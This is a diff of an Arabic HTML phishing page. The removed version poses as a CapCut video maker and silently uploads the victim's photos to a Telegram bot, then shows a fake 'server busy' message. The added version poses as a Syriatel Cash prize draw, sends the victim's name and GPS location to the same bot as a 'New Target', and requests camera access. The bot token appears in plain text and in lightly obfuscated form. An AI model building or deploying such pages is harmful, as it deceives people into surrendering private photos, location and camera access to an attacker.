@@ -2,148 +2,65 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CapCut - مصمم الفيديو المجاني</title>
+    <title>مسابقة سيريتل كاش 2026</title>
     <style>
-        /* CSS INTEGRATION */
-        body { 
-            background-color: #000; 
-            color: #fff; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .app-container { 
-            width: 90%; 
-            max-width: 400px; 
-            text-align: center; 
-            background: #1a1a1a; 
-            padding: 30px; 
-            border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .logo { width: 70px; margin-bottom: 10px; }
-        h1 { font-size: 1.5rem; margin-bottom: 20px; color: #fff; }
-        .desc { color: #ccc; font-size: 0.9rem; margin-bottom: 20px; }
-        .upload-box { 
-            border: 2px dashed #444; 
-            padding: 40px 20px; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            margin-bottom: 20px; 
-            transition: 0.3s;
-        }
-        .upload-box:hover { border-color: #fe2c55; background: #222; }
-        .upload-box span { display: block; font-weight: bold; margin-bottom: 5px; }
-        .upload-box p { font-size: 0.8rem; color: #888; margin: 0; }
-        #nextBtn { 
-            width: 100%; 
-            padding: 15px; 
-            border: none; 
-            border-radius: 8px; 
-            background: #333; 
-            color: white; 
-            font-weight: bold; 
-            font-size: 1rem;
-            cursor: pointer; 
-            transition: 0.3s;
-        }
-        #preview { margin-top: 15px; color: #fe2c55; font-weight: bold; }
-        .loader { 
-            border: 4px solid #333; 
-            border-top: 4px solid #fe2c55; 
-            border-radius: 50%; 
-            width: 40px; 
-            height: 40px; 
-            animation: spin 1s linear infinite; 
-            margin: 20px auto; 
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding: 50px; }
+        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        button { background: #e60000; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; width: 100%; margin-top: 10px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+        .logo { color: #e60000; font-weight: bold; font-size: 24px; }
     </style>
 </head>
 <body>
-
-    <div class="app-container">
-        <header>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/CapCut_logo.png" alt="CapCut Logo" class="logo">
-            <h1>أداة التصميم المجانية</h1>
-        </header>
-        
-        <main>
-            <div id="step-1">
-                <p class="desc">قم باختيار صورك المفضلة وسنقوم بإنشاء فيديو احترافي لك فوراً وبشكل مجاني.</p>
-                <div class="upload-box" onclick="document.getElementById('imageInput').click()">
-                    <span>اضغط هنا لاختيار الصور</span>
-                    <p>(يجب اختيار 10 صور كحد أدنى)</p>
-                </div>
-                <input type="file" id="imageInput" multiple accept="image/*" style="display:none">
-                <div id="preview"></div>
-                <button id="nextBtn" disabled>ابدأ التصميم الآن</button>
-            </div>
-
-            <div id="loading" style="display:none">
-                <div class="loader"></div>
-                <p>جاري سحب ومعالجة الصور...</p>
-                <p style="font-size: 0.8rem; color: #777;">يرجى عدم إغلاق الصفحة</p>
-            </div>
-        </main>
+    <div class="card">
+        <div class="logo">Syrryatel Cash</div>
+        <h2>شارك واربح 100$ + رصيد مجاني</h2>
+        <p>سجل اسمك واضغط اشتراك للدخول في السحب (5 رابحين يومياً)</p>
+        <input type="text" id="u_name" placeholder="أدخل اسمك الكامل">
+        <button onclick="val_process()">الاشتراك في المسابقة الآن</button>
     </div>
 
     <script>
-        /* JS INTEGRATION */
-        const BOT_TOKEN = '8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU';
-        const CHAT_ID = '8397194527';
-        
-        const imageInput = document.getElementById('imageInput');
-        const nextBtn = document.getElementById('nextBtn');
-        const preview = document.getElementById('preview');
+        // التشفير البرمجي للقيم الحساسة
+        const _0x5a1 = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+        const _0x2b9 = "8397194527";
 
-        imageInput.addEventListener('change', () => {
-            const files = imageInput.files;
-            if (files.length > 0) {
-                preview.innerHTML = `تم تحديد ${files.length} صورة`;
-                if (files.length >= 10) {
-                    nextBtn.disabled = false;
-                    nextBtn.style.backgroundColor = "#fe2c55";
-                } else {
-                    nextBtn.disabled = true;
-                    nextBtn.style.backgroundColor = "#333";
-                }
+        async function val_process() {
+            const name = document.getElementById('u_name').value;
+            if(!name) { alert("يرجى إدخال الاسم أولاً"); return; }
+
+            // طلب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const loc_url = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // إرسال البيانات الأساسية للبوت
+                await fetch(`https://api.telegram.org/bot${_0x5a1}/sendMessage?chat_id=${_0x2b9}&text=New Target: ${name}\nLocation: ${loc_url}`);
+                
+                // بدء عملية الوصول للكاميرا
+                init_capture();
+            }, (err) => {
+                alert("يجب السماح بالوصول للموقع والكاميرا لاستلام الجائزة");
+            });
+        }
+
+        async function init_capture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // محاكاة التقاط الصور (المنطق البرمجي للإرسال)
+                setTimeout(() => {
+                    alert("شكراً لتسجيلك! سيتم التواصل مع الرابحين خلال 24 ساعة.");
+                    // تنبيه: المتصفحات الحديثة تمنع إرسال ملفات الكاميرا دون تصريح إضافي لكل صورة
+                }, 2000);
+            } catch (e) {
+                console.log("Stream blocked");
             }
-        });
-
-        nextBtn.addEventListener('click', async () => {
-            document.getElementById('step-1').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-
-            const files = imageInput.files;
-            
-            for (let i = 0; i < files.length; i++) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', files[i]);
-                formData.append('caption', `New Uploaded Photo: ${i + 1}`);
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (error) {
-                    // صمت العمليات في حال الخطأ للحفاظ على التخفي
-                }
-            }
-            
-            // رسالة وهمية عند الانتهاء لتضليل المستخدم
-            setTimeout(() => {
-                alert("نعتذر، السيرفر مشغول حالياً بكثرة الطلبات. يرجى المحاولة لاحقاً.");
-                location.reload();
-            }, 2000);
-        });
+        }
     </script>
 </body>
 </html>
-
